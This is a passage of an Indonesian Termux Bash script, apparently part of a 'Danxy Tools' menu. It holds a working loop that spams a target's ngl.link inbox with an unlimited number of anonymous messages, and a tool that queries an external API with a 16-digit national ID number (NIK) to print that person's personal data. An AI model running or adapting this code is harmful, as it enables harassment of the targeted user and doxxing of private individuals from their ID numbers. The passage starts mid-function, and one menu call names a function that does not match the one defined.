⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠋⠀⠀⠀⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠾⢛⠒⠀⠀⠀⠀⠀⠀⠀⢸⡆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣶⣄⡈⠓⢄⠠⡀⠀⠀⠀⣄⣷⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⠀⠈⠱⡄⠑⣌⠆⠀⠀⡜⢻⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡿⠳⡆⠐⢿⣆⠈⢿⠀⠀⡇⠘⡆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣷⡇⠀⠀⠈⢆⠈⠆⢸⠀⠀⢣⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣧⠀⠀⠈⢂⠀⡇⠀⠀⢨⠓⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⣦⣤⠖⡏⡸⠀⣀⡴⠋⠀⠈⠢⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⠁⣹⣿⣿⣿⣷⣾⠽⠖⠊⢹⣀⠄⠀⠀⠀⠈⢣⡀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⣇⣰⢫⢻⢉⠉⠀⣿⡆⠀⠀⡸⡏⠀⠀⠀⠀⠀⠀⢇
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢨⡇⡇⠈⢸⢸⢸⠀⠀⡇⡇⠀⠀⠁⠻⡄⡠⠂⠀⠀⠀⠘
⢤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⠓⡇⠀⠸⡆⢸⠀⢠⣿⠀⠀⠀⠀⣰⣿⣵⡆⠀⠀⠀⠀
⠈⢻⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡿⣦⣀⡇⠀⢧⡇⠀⠀⢺⡟⠀⠀⠀⢰⠉⣰⠟⠊⣠⠂⠀⡸
⠀⠀⢻⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀${BG_RED}${YELLOW}∅ SPAM NGL${NC}${RED}⠀ ⣠⢧⡙⠺⠿⡇⠀⠘⠇⠀⠀⢸⣧⠀⠀⢠⠃⣾⣌⠉⠩⠭⠍⣉⡇
⠀⠀⠀⠻⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣞⣋⠀⠈⠀⡳⣧⠀⠀⠀⠀⠀⢸⡏⠀⠀⡞⢰⠉⠉⠉⠉⠉⠓⢻⠃
⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⢀⣀⠠⠤⣤⣤⠤⠞⠓⢠⠈⡆⠀⢣⣸⣾⠆⠀⠀⠀⠀⠀⢀⣀⡼⠁⡿⠈⣉⣉⣒⡒⠢⡼⠀
⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣎⣽⣶⣤⡶⢋⣤⠃⣠⡦⢀⡼⢦⣾⡤⠚⣟⣁⣀⣀⣀⣀⠀⣀⣈⣀⣠⣾⣅⠀⠑⠂⠤⠌⣩⡇⠀
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡁⣺⢁⣞⣉⡴⠟⡀⠀⠀⠀⠁⠸⡅⠀⠈⢷⠈⠏⠙⠀⢹⡛⠀⢉⠀⠀⠀⣀⣀⣼⡇⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⡟⢡⠖⣡⡴⠂⣀⣀⣀⣰⣁⣀⣀⣸⠀⠀⠀⠀⠈⠁⠀⠀⠈⠀⣠⠜⠋⣠⠁⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⡟⢿⣿⣿⣷⡟⢋⣥⣖⣉⠀⠈⢁⡀⠤⠚⠿⣷⡦⢀⣠⣀⠢⣄⣀⡠⠔⠋⠁⠀⣼⠃⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⡄⠈⠻⣿⣿⢿⣛⣩⠤⠒⠉⠁⠀⠀⠀⠀⠀⠉⠒⢤⡀⠉⠁⠀⠀⠀⠀⠀⢀⡿⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⢿⣤⣤⠴⠟⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠑⠤⠀⠀⠀⠀⠀⢩⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀${NC}

${RED}██████╗░░█████╗░██████╗░░░░███╗░░██╗░██████╗░██╗
██╔══██╗██╔══██╗██╔══██╗░░░████╗░██║██╔════╝░██║
██║░░██║██║░░██║██████╔╝░░░██╔██╗██║██║░░██╗░██║
${WHITE}██║░░██║██║░░██║██╔══██╗░░░██║╚████║██║░░╚██╗██║
██████╔╝╚█████╔╝██║░░██║██╗██║░╚███║╚██████╔╝███████╗
╚═════╝░░╚════╝░╚═╝░░╚═╝╚═╝╚═╝░░╚══╝░╚═════╝░╚══════╝
${BG_RED}${YELLOW}[ ! ] SPAM NGL TARGET UNLIMITED${NC}"
  RED='\033[0;31m'; GREEN='\033[0;32m'; NC='\033[0m'

  read -p "USERNAME NGL TARGET: " USERNAME
  read -p "PESAN UNTUK TARGET: " PESAN
  read -p "NOMINAL SPAM: " JUMLAH

  # URL-encode pesan agar aman di POST data
  PESAN_ENC=$(printf '%s' "$PESAN" | sed 's/ /%20/g' | sed 's/+/%2B/g')

  for ((i=1; i<=JUMLAH; i++)); do
    RESPON=$(curl -s -w "%{http_code}" -o /dev/null -X POST \
      -H "User-Agent: Termux" \
      -H "Referer: https://ngl.link/$USERNAME" \
      -d "username=$USERNAME&question=$PESAN_ENC&deviceId=termuxtest" \
      "https://ngl.link/api/submit")

    if [[ "$RESPON" == "200" ]]; then
      echo -e "${GREEN}[$i] Sukses${NC}"
    else
      echo -e "${RED}[$i] Gagal (kode: $RESPON)${NC}"
    fi
  done
}




show_banner() {
  clear
  echo "
╔═════════════════════════════════════════════════════════╗
║                         ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀             ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀ ⠀⠀⠀⠀               ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀              ║
║             ⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀              ║
║             ⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀@⠀⢠⡄⠀@⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀              ║
║             ⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀              ║
║             ⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀              ║
║              ⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀              ║
║              ⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀              ║
║              ⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀                          ║
╚═════════════════════════════════════════════════════════╝
║     TRACKING DATA INFORMASI NIK⠀BY DANXY TOOLS V8.4     ║
╚═════════════════════════════════════════════════════════╝
" | lolcat
}
cek_nik_kk() {
    while true; do
        show_banner
        echo -e "${YELLOW}${BOLD}TEKAN 0 UNTUK KEMBALI KE MENU"
        printf "${GREEN}┏━[ ${RED}MASUKAN NIK 16 DIGIT${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}TRACKING NIK${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} " 
        read -r nik
        
        if [ "$nik" = "0" ]; then
            echo -e "${YELLOW}[ ! ] KEMBALI KE MENU UTAMA${NC}"
            sleep 1
            return
        fi
        
        if [[ ! $nik =~ ^[0-9]{16}$ ]]; then
            echo -e "${RED}[ ! ] NIK HARUS ADA 16 DIGIT${NC}"
            echo -e "${YELLOW} CONTOH: 3273011234567890${NC}"
            echo -e "\n${BLUE} TEKAN ENTER UNTUK KEMBALI KE MENU${NC}"
            read -r
            continue
        fi
        
        echo -e "${YELLOW}[ * ] TRACKING DATA NIK: $nik${NC}"        
        response=$(curl -s "${API_URL}${nik}")
        if [ $? -ne 0 ]; then
            echo -e "${RED}[!] Error: Failed to connect to API${NC}"
        elif [ -z "$response" ]; then
            echo -e "${RED}[!] Error: No response from API${NC}"
        else
            
            # Filter out the creator line from API response
            echo -e "${RED}╔═════════════════════════════════════════════════════════╗"
            echo "${RED}║${GREEN} $response" | grep -v "creator" | grep -oE '"([^"]+)":\s*"([^"]*)"' | while read -r line; do
                key=$(echo "${RED}║${GREEN} $line" | cut -d'"' -f2)
                value=$(echo "${RED}║${GREEN} $line" | cut -d'"' -f4)
                echo -e "${RED}║${GREEN} ${WHITE}${BOLD}$key: ${GREEN}$value${NC}"
            echo -e "${RED}╚═════════════════════════════════════════════════════════╝"
            done
        fi
        
        echo -e "\n${BLUE}TEKAN ENTER UNTUK KEMBALI KE MENU${NC}"
        read -r choice
        if [ "$choice" = "0" ]; then
            return
        fi
    done
}

check_commands() {
    local missing_commands=()
    
    if ! command -v curl &> /dev/null; then
        missing_commands+=("curl")
    fi
    
    if [ ${#missing_commands[@]} -ne 0 ]; then
        echo -e "${RED}[!] Error: Perintah berikut diperlukan tetapi tidak diinstal:${NC}"
        printf '%s\n' "${missing_commands[@]}"
        echo -e "\n${YELLOW}[*] Silakan menginstalnya menggunakan: pkg install ${missing_commands[*]}${NC}"
        return 1
    fi
    
    return 0
}

CheckerNik() {
    if ! check_commands; then
        echo -e "\n${RED}[!] Tidak dapat melanjutkan tanpa perintah yang diperlukan.${NC}"
        echo -e "${BLUE}Tekan enter untuk kembali...${NC}"
        read -r
        return
    fi
    
    while true; do
        show_banner
        echo -e "${BLUE}KETIK 0 UNTUK KELUAR DARI MENU"
        echo -n -e "${BLUE}KETIK 1 UNTUK MELANJUTKAN [1/0]: ${NC}"
        read -r choice
        
        case $choice in
            1)
                check_nik
                ;;
            0)
                echo -e "${GREEN}[+] Terima kasih telah menggunakan alat ini!${NC}"
                echo -e "${YELLOW}[*] Goodbye!${NC}"
                return
                ;;
            *)
                echo -e "${RED}[!] Pilihan tidak valid! Silakan pilih 1 atau 0${NC}"
                sleep 2
                ;;
        esac
    done
}

if [ ! -d "/data/data/com.termux" ]; then
    echo -e "${RED}[!] Warning: This script is designed for Termux${NC}"
    echo -e "${YELLOW}[*] Continuing anyway...${NC}"
    sleep 2
fi

install_dependencies() {
  echo -e "${YELLOW}Memeriksa dan menginstal dependensi...${NC}"
  sleep 2

  if sudo apt update &>/dev/null && sudo apt install curl jq figlet lolcat xdg-utils python3 python3-pip openssl -y &>/dev/null; then
    echo -e "${GREEN}Semua dependensi telah terinstal.${NC}"
    sudo pip3 install requests
  else
  sleep 2
    echo -e "${RED}JIKA ADA YANG ERROR TANYAKAN KE DANXY JANGAN MALU YHA!!${NC}"
  fi
  sleep 3
}

kembali_ke_menu() {
  read -n 1 -s -r -p "TEKAN ENTER UNTUK KEMBALI KE MENU AWAL"
  echo
}



show_whatsapp_support() {
  echo -e "${BLUE}JANGAN LUPA JOIN CHANNEL DanxyBot YHA MAKASIH${NC}"
  xdg-open "$WHATSAPP_CHANNEL_URL" &
  sleep 5
}

kasi_warna_green() {
  echo -e "${GREEN}$1${NC}"
}

install_dependencies
show_whatsapp_support
main_menu
